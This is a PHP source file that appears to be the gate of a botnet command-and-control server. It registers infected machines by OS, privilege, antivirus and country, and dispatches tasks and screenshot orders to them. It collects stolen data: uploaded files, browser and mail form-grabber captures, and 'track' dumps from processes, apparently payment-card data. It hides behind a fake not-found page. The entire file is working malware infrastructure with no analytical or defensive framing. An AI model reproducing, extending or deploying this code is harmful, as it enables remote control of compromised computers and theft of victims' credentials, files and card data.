<?php
header('Content-Type: text/html; charset=utf8');
define('N3N', 1);
include('config.php');
include('functions.php');

$mysqli = ConnectMySQLi($db_host, $db_login, $db_password, $db_database);
$real_ip = get_real_ip();

$reason = null;
if (CheckAllowed($mysqli, $real_ip, $reason)) {
    AddBan($mysqli, $real_ip, $reason);
    $mysqli->close();
    NotFound();
}

$time = time();
$date = date('Y-m-d H:i:s');
$command = null;

$enc_arr = isset($_POST['_wv']) ? $_POST['_wv'] : '';
$arr_cmd = explode('&', base64_decode($enc_arr));

$bot_uid = md5(isset($arr_cmd[1]) ? $arr_cmd[1] : 'FAIL');
$bot_name = (isset($arr_cmd[2]) ? $arr_cmd[2] : 'FAIL');
$bot_build_id = (isset($arr_cmd[8]) ? $arr_cmd[8] : 'NONE');

if (strcasecmp($arr_cmd[0], 'cmd') == 0) {

    $bot_os = $mysqli->real_escape_string($arr_cmd[3]);
    $bot_priv = (int)$arr_cmd[4];
    $bot_av = $mysqli->real_escape_string($arr_cmd[5]);
    $bot_version = $mysqli->real_escape_string($arr_cmd[6]);
    $bot_lifetime = $mysqli->real_escape_string($arr_cmd[7]);

    $gi = geoip_open('GeoIP/GeoIP.dat', GEOIP_STANDARD);
    $bot_country = geoip_country_code_by_addr($gi, $real_ip);
    if ($bot_country == null) {
        $bot_country = 'O1';
    }
    geoip_close($gi);

    $bot_comment = $mysqli->query("SELECT bot_comment FROM botnet_bots WHERE bot_uid = '$bot_uid'")->fetch_object()->bot_comment;
    $mysqli->query("REPLACE INTO botnet_bots (bot_uid, bot_os, bot_priv,  bot_name, bot_version, bot_ip, bot_av, bot_time, bot_lifetime, bot_date, bot_country, bot_comment, bot_build_id)
    VALUES ('$bot_uid', '$bot_os', '$bot_priv', '$bot_name', '$bot_version', '$real_ip', '$bot_av', '$time', '$bot_lifetime', '$date', '$bot_country', '$bot_comment', '$bot_build_id')");

    $scr_enabled = $mysqli->query('SELECT name FROM admin_config WHERE id = 3')->fetch_object()->name;
    if ($scr_enabled == 'checked') {
        $command = '1463020066516169#screenshot#';
    }

    $command .= refresh_rate($mysqli, 'get_cc', null);
    $res = $mysqli->query('SELECT * FROM botnet_tasks WHERE status = 1');
    if ($res) {
        while ($row = $res->fetch_assoc()) {
            if ($row['needexecs'] != 0) {
                $task_given_count = $row['given'];
                $mysqli->query("UPDATE botnet_tasks SET given = `given`+1 WHERE task_id = '" . addslashes($row['task_id']) . "'");
            }
            if ($row['needexecs'] != 0 && $row['needexecs'] == $row['given']) {
                $mysqli->query("UPDATE botnet_tasks SET status='0' WHERE task_id = '" . addslashes($row['task_id']) . "'");
            } else {
                $bot = $row['bots'];
                $task_by_build_id = !empty($row['build_id']) ? $row['build_id'] : 'ALL';
                if ($task_by_build_id == $bot_build_id || $task_by_build_id == 'ALL') {
                    if (strlen($bot) == 2 && $bot == $bot_country) { // by country
                        $command .= $row['task_id'] . $row['tasks_pref'] . $row['command'] . $row['tasks_postf'];
                    }
                    if (strlen($bot) == 35 && $bot == "ID:$bot_uid") { // by id
                        $command .= $row['task_id'] . $row['tasks_pref'] . $row['command'] . $row['tasks_postf'];
                    }
                    if (strlen($bot) == 3) { // All bots
                        $command .= $row['task_id'] . $row['tasks_pref'] . $row['command'] . $row['tasks_postf'];
                    }
                }
            }
        }
    }
} else if (strcasecmp($arr_cmd[0], 'log') == 0) {

    $event_type = null;
    $temp = $mysqli->real_escape_string($arr_cmd[3]);
    $event_text = $mysqli->real_escape_string($arr_cmd[4]);

    switch ($temp) {
        case 'p':
            $event_type = 'Found process ';
            break;
        case 'd':
            $event_type = 'Debug ';
            break;
        case 'c':
            $event_type = 'Cmd ';
            break;
    }
    $event_hash = md5($bot_uid . $event_text . $event_type);
    $mysqli->query("REPLACE INTO botnet_logs (bot_uid, bot_ip, event_name, event_text, event_date_time, event_hash)
			       VALUES ('$bot_uid', '$real_ip', '$event_type', '$event_text', '$date', '$event_hash')");


} else if (strcasecmp($arr_cmd[0], 'plugin') == 0) {
    $plugin_name = $mysqli->real_escape_string($arr_cmd[3]);
    $plugin_data = $mysqli->real_escape_string($arr_cmd[4]);
    $plugin_hash = md5($bot_uid . $plugin_name . $plugin_data);

    $mysqli->query("REPLACE INTO botnet_plugin (event_name, event_text, event_date_time, event_hash, bot_ip, bot_uid)
			       VALUES ('$plugin_name', '$plugin_data', '$date', '$plugin_hash', '$real_ip', '$bot_uid')");

} else if (strcasecmp($arr_cmd[0], 'proxy') == 0) {
    $end_point_ip = $mysqli->real_escape_string($arr_cmd[4]);
    if (filter_var($end_point_ip, FILTER_VALIDATE_IP)) {

        $end_point_uid = $mysqli->query('SELECT bot_uid FROM botnet_bots WHERE bot_ip = "' . $end_point_ip . '"')->fetch_object()->bot_uid;
        $end_point_country = $mysqli->query('SELECT bot_country FROM botnet_bots WHERE bot_uid = "' . $end_point_uid . '"')->fetch_object()->bot_country;

        if (!empty($end_point_uid)) {
            $bc_server = $real_ip;
            $bc_server_port = $mysqli->real_escape_string($arr_cmd[3]);
            $bc_hash = md5($end_point_uid . $bc_server . $bc_server_port);

            $mysqli->query("REPLACE INTO botnet_proxy (bot_uid, bot_ip, bc_ip, bc_port, bot_date, bot_country, proxy_hash	)
			       VALUES ('$end_point_uid', '$end_point_ip ', '$bc_server', '$bc_server_port', '$date', '$end_point_country', '$bc_hash')");
        }
    }
} else if (strcasecmp($arr_cmd[0], 'fail') == 0) {
    $task_id = $mysqli->real_escape_string($arr_cmd[1]);
    $mysqli->query("UPDATE botnet_tasks SET failed = `failed`+1 WHERE task_id = '$task_id'");

} else if (strcasecmp($arr_cmd[0], 'exec') == 0) {
    $task_id = $mysqli->real_escape_string($arr_cmd[1]);
    $mysqli->query("UPDATE botnet_tasks SET execs = `execs`+1 WHERE task_id = '$task_id'");

} else if (!empty($_FILES)) {

    $bot_uid = md5(isset($_COOKIE['uid']) ? $_COOKIE['uid'] : 'FAIL');
    $file_name = ($_FILES['data']['name']);
    $file_size = $_FILES['data']['size'];
    $hash_file = md5_file($_FILES['data']['tmp_name']);

    $dirname = 'files';
    chdir($dirname);
    if (move_uploaded_file($_FILES['data']['tmp_name'], $hash_file)) {
        chmod($hash_file, 0644);
        $mysqli->query("REPLACE INTO botnet_files (bot_uid, bot_ip, file_path, file_size, file_data, file_hash) VALUES ('$bot_uid', '$real_ip', '$file_name', '$file_size', '$date', '$hash_file')");
    }

} else if (strcasecmp($arr_cmd[0], 'ff') == 0) {
    $bot_host = $arr_cmd[3];
    if (ff_state($mysqli) and ff_nblacklisted($mysqli, $bot_host)) {
        $bot_browser = $arr_cmd[5];
        switch ($bot_browser) {
            case 1:
                $bot_browser = 'iexplorer';
                break;
            case 2:
                $bot_browser = 'firefox';
                break;
            case 3:
                $bot_browser = 'chrome';
                break;
            case 4:
                $bot_browser = 'mail';
                break;
            default:
                $bot_browser = 'iexplorer';
                break;
        }
        $bot_form = $arr_cmd[4];
        $bot_form_hash = md5($bot_form);

        $mysqli->query("REPLACE INTO botnet_ff (bot_ip, bot_uid, bot_host, bot_form, bot_form_hash, bot_browser, bot_date, bot_time)
			       VALUES ('$real_ip', '$bot_uid', '$bot_host', '$bot_form', '$bot_form_hash', '$bot_browser', '$date', '$time')");
    }
} else if (strcasecmp($arr_cmd[0], 'd') == 0) {

    $track_type = $mysqli->real_escape_string($arr_cmd[3]);
    $track_data = base64_encode($arr_cmd[4]);
    $track_hash = md5($track_data);
    $process_name = urlencode($mysqli->real_escape_string($arr_cmd[5]));

    $mysqli->query("REPLACE INTO botnet_dumps (bot_uid, bot_ip, track_type, track_data, process_name, bot_date, bot_time, track_hash)
			       VALUES ('$bot_uid', '$real_ip', '$track_type', '$track_data', '$process_name', '$date', '$time', '$track_hash')");
} elseif (strcasecmp($arr_cmd[0], 'enter') == 0) {
    $command = 'success';
}
$mysqli->close();
NotFound($command);